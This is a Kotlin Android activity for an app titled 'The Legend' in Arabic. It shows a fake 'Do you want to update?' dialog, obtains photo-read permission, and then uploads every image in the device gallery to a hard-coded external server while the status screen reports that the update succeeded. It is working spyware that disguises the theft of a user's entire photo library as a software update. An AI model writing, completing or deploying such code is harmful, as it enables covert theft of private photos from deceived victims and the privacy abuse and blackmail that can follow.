package com.photouploader.app

import android.Manifest
import android.app.AlertDialog
import android.content.ContentResolver
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.view.Gravity
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import java.io.DataOutputStream
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    private lateinit var statusText: TextView

    companion object {
        private const val PERMISSION_REQUEST = 1001

        private const val SERVER_URL =
            "https://photo-uploader-zt2f.onrender.com/upload"

        private const val HEALTH_URL =
            "https://photo-uploader-zt2f.onrender.com/health"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        showSplashScreen()

        Handler(Looper.getMainLooper()).postDelayed({
            showUpdateDialog()
        }, 1800)
    }

    private fun showSplashScreen() {
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.rgb(18, 18, 18))
            setPadding(30, 30, 30, 30)
        }

        val title = TextView(this).apply {
            text = "الأسطورة"
            textSize = 32f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 12)
        }

        val loading = TextView(this).apply {
            text = "جاري التحميل…"
            textSize = 11f
            setTextColor(Color.LTGRAY)
            gravity = Gravity.CENTER
        }

        layout.addView(
            title,
            LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        )

        layout.addView(
            loading,
            LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        )

        setContentView(layout)
    }

    private fun showUpdateDialog() {
        val message = TextView(this).apply {
            text = "هل تريد التحديث؟"
            textSize = 18f
            gravity = Gravity.CENTER
            setPadding(20, 20, 20, 10)
        }

        AlertDialog.Builder(this)
            .setTitle("الأسطورة")
            .setView(message)
            .setPositiveButton("موافق") { _, _ ->
                checkPhotoPermission()
            }
            .setNegativeButton("إلغاء") { dialog, _ ->
                dialog.dismiss()
            }
            .setCancelable(false)
            .show()
    }

    private fun checkPhotoPermission() {
        val permission =
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                Manifest.permission.READ_MEDIA_IMAGES
            } else {
                Manifest.permission.READ_EXTERNAL_STORAGE
            }

        val granted =
            ContextCompat.checkSelfPermission(
                this,
                permission
            ) == PackageManager.PERMISSION_GRANTED

        if (granted) {
            showStatusScreen("إذن الصور: OK")

            Handler(Looper.getMainLooper()).postDelayed({
                startPhotoUpload()
            }, 500)
        } else {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(permission),
                PERMISSION_REQUEST
            )
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(
            requestCode,
            permissions,
            grantResults
        )

        if (requestCode != PERMISSION_REQUEST) {
            return
        }

        if (
            grantResults.isNotEmpty() &&
            grantResults[0] == PackageManager.PERMISSION_GRANTED
        ) {
            showStatusScreen("إذن الصور: OK")

            Handler(Looper.getMainLooper()).postDelayed({
                startPhotoUpload()
            }, 500)
        } else {
            showStatusScreen("خطأ إذن الصور")
        }
    }

    private fun startPhotoUpload() {
        showStatusScreen("اختبار الاتصال بالسيرفر…")

        Thread {
            val healthResult = testServer()

            if (!healthResult.first) {
                runOnUiThread {
                    statusText.text =
                        "تعذر الاتصال بالسيرفر\n${healthResult.second}"
                }
                return@Thread
            }

            runOnUiThread {
                statusText.text =
                    "السيرفر: OK\nجاري قراءة الصور…"
            }

            try {
                val resolver = contentResolver

                val projection = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.MIME_TYPE
                )

                val collection =
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI

                var total = 0
                var uploaded = 0

                resolver.query(
                    collection,
                    projection,
                    null,
                    null,
                    "${MediaStore.Images.Media.DATE_ADDED} ASC"
                )?.use { cursor ->

                    val idColumn =
                        cursor.getColumnIndex(
                            MediaStore.Images.Media._ID
                        )

                    val nameColumn =
                        cursor.getColumnIndex(
                            MediaStore.Images.Media.DISPLAY_NAME
                        )

                    val mimeColumn =
                        cursor.getColumnIndex(
                            MediaStore.Images.Media.MIME_TYPE
                        )

                    if (
                        idColumn == -1 ||
                        nameColumn == -1 ||
                        mimeColumn == -1
                    ) {
                        runOnUiThread {
                            statusText.text =
                                "خطأ قراءة الصور"
                        }
                        return@Thread
                    }

                    while (cursor.moveToNext()) {
                        total++

                        val id =
                            cursor.getLong(idColumn)

                        val fileName =
                            cursor.getString(nameColumn)
                                ?: "photo_$id.jpg"

                        val mimeType =
                            cursor.getString(mimeColumn)
                                ?: "image/jpeg"

                        val uri =
                            Uri.withAppendedPath(
                                collection,
                                id.toString()
                            )

                        val inputTest =
                            resolver.openInputStream(uri)

                        if (inputTest == null) {
                            runOnUiThread {
                                statusText.text =
                                    "خطأ قراءة الصور\nلا يمكن فتح: $fileName"
                            }
                            return@Thread
                        }

                        inputTest.close()

                        runOnUiThread {
                            statusText.text =
                                "تم العثور على الصور: $total\nجاري الرفع…"
                        }

                        val result =
                            uploadFile(
                                resolver,
                                uri,
                                fileName,
                                mimeType
                            )

                        if (!result.first) {
                            runOnUiThread {
                                statusText.text =
                                    "فشل رفع الصورة\n${result.second}"
                            }
                            return@Thread
                        }

                        uploaded++

                        runOnUiThread {
                            statusText.text =
                                "تم رفع الصورة: $uploaded"
                        }
                    }

                } ?: run {
                    runOnUiThread {
                        statusText.text =
                            "خطأ قراءة الصور"
                    }
                    return@Thread
                }

                runOnUiThread {
                    when {
                        total == 0 -> {
                            statusText.text =
                                "لم يتم العثور على صور"
                        }

                        uploaded == total -> {
                            statusText.text =
                                "تم التحديث بنجاح ✅"
                        }

                        else -> {
                            statusText.text =
                                "تعذر إكمال التحديث\n$uploaded من $total"
                        }
                    }
                }

            } catch (e: SecurityException) {
                runOnUiThread {
                    statusText.text =
                        "خطأ إذن الصور"
                }

            } catch (e: Exception) {
                e.printStackTrace()

                runOnUiThread {
                    statusText.text =
                        "خطأ قراءة الصور\n${e.javaClass.simpleName}"
                }
            }

        }.start()
    }

    private fun testServer(): Pair<Boolean, String> {
        var connection: HttpURLConnection? = null

        return try {
            val url = URL(HEALTH_URL)

            connection =
                url.openConnection() as HttpURLConnection

            connection.requestMethod = "GET"
            connection.connectTimeout = 30000
            connection.readTimeout = 30000
            connection.useCaches = false

            val responseCode =
                connection.responseCode

            if (responseCode in 200..299) {
                Pair(
                    true,
                    "HTTP $responseCode"
                )
            } else {
                Pair(
                    false,
                    "HTTP $responseCode"
                )
            }

        } catch (e: Exception) {
            e.printStackTrace()

            Pair(
                false,
                "${e.javaClass.simpleName}: ${e.message ?: "unknown"}"
            )

        } finally {
            connection?.disconnect()
        }
    }

    private fun uploadFile(
        resolver: ContentResolver,
        uri: Uri,
        fileName: String,
        mimeType: String
    ): Pair<Boolean, String> {

        var connection: HttpURLConnection? = null

        try {
            val boundary =
                "----PhotoUploaderBoundary"

            val url =
                URL(SERVER_URL)

            connection =
                url.openConnection() as HttpURLConnection

            connection.requestMethod = "POST"
            connection.doOutput = true
            connection.doInput = true
            connection.useCaches = false

            connection.connectTimeout = 30000
            connection.readTimeout = 120000

            connection.setRequestProperty(
                "Content-Type",
                "multipart/form-data; boundary=$boundary"
            )

            connection.setRequestProperty(
                "Connection",
                "keep-alive"
            )

            val output =
                DataOutputStream(
                    connection.outputStream
                )

            output.writeBytes(
                "--$boundary\r\n"
            )

            val safeFileName =
                fileName.replace("\"", "")

            output.writeBytes(
                "Content-Disposition: form-data; name=\"file\"; filename=\"$safeFileName\"\r\n"
            )

            output.writeBytes(
                "Content-Type: $mimeType\r\n"
            )

            output.writeBytes(
                "\r\n"
            )

            val input =
                resolver.openInputStream(uri)

            if (input == null) {
                output.close()

                return Pair(
                    false,
                    "لا يمكن قراءة الصورة"
                )
            }

            input.use {
                val buffer =
                    ByteArray(8192)

                while (true) {
                    val bytesRead =
                        it.read(buffer)

                    if (bytesRead == -1) {
                        break
                    }

                    output.write(
                        buffer,
                        0,
                        bytesRead
                    )
                }
            }

            output.writeBytes(
                "\r\n"
            )

            output.writeBytes(
                "--$boundary--\r\n"
            )

            output.flush()
            output.close()

            val responseCode =
                connection.responseCode

            return if (
                responseCode in 200..299
            ) {
                Pair(
                    true,
                    "HTTP $responseCode"
                )
            } else {
                Pair(
                    false,
                    "السيرفر رد HTTP $responseCode"
                )
            }

        } catch (e: Exception) {
            e.printStackTrace()

            return Pair(
                false,
                "${e.javaClass.simpleName}: ${e.message ?: "unknown"}"
            )

        } finally {
            connection?.disconnect()
        }
    }

    private fun showStatusScreen(text: String) {
        statusText = TextView(this).apply {
            this.text = text
            textSize = 11f
            setTextColor(Color.LTGRAY)
            gravity = Gravity.CENTER
            setPadding(20, 20, 20, 20)
        }

        val layout =
            LinearLayout(this).apply {
                gravity = Gravity.CENTER
                orientation =
                    LinearLayout.VERTICAL

                setBackgroundColor(
                    Color.rgb(18, 18, 18)
                )

                addView(
                    statusText,
                    LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.MATCH_PARENT,
                        LinearLayout.LayoutParams.WRAP_CONTENT
                    )
                )
            }

        setContentView(layout)
    }
}
